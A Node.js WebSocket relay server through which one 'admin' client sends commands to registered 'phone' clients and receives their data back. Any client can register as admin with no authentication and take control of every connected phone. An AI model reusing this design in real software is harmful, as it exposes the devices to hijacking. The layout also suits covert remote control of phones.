const express = require('express');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let adminSocket = null;
let phones = {}; // phoneId → ws

wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === 'register') {
                if (data.role === 'admin') {
                    adminSocket = ws;
                    console.log('Admin connected');
                    ws.send(JSON.stringify({type:'registered', role:'admin'}));
                    // Tell admin all online phones
                    Object.keys(phones).forEach(pid => {
                        ws.send(JSON.stringify({type:'phone-online', phoneId: pid}));
                    });
                }
                else if (data.role === 'phone') {
                    const phoneId = data.phoneId || ('phone-' + Date.now());
                    ws.phoneId = phoneId;
                    phones[phoneId] = ws;
                    console.log('Phone connected: ' + phoneId);
                    ws.send(JSON.stringify({type:'registered', role:'phone', phoneId}));
                    if (adminSocket) {
                        adminSocket.send(JSON.stringify({type:'phone-online', phoneId}));
                    }
                }
            }
            // Admin → Phone
            else if (data.type === 'command') {
                const target = data.targetPhone;
                if (target && phones[target]) {
                    phones[target].send(JSON.stringify(data));
                } else {
                    // Send to all phones
                    Object.values(phones).forEach(p => p.send(JSON.stringify(data)));
                }
            }
            // Phone → Admin
            else if (data.type === 'data' && adminSocket) {
                data.phoneId = ws.phoneId;
                adminSocket.send(JSON.stringify(data));
            }

        } catch (e) {
            console.log('Error:', e.message);
        }
    });

    ws.on('close', () => {
        if (ws === adminSocket) {
            adminSocket = null;
            console.log('Admin disconnected');
        }
        if (ws.phoneId && phones[ws.phoneId]) {
            delete phones[ws.phoneId];
            console.log('Phone disconnected: ' + ws.phoneId);
            if (adminSocket) {
                adminSocket.send(JSON.stringify({type:'phone-offline', phoneId: ws.phoneId}));
            }
        }
    });
});

app.get('/', (req, res) => res.send('Server OK!'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Server on port ' + PORT));
setInterval(() => console.log('alive'), 240000);
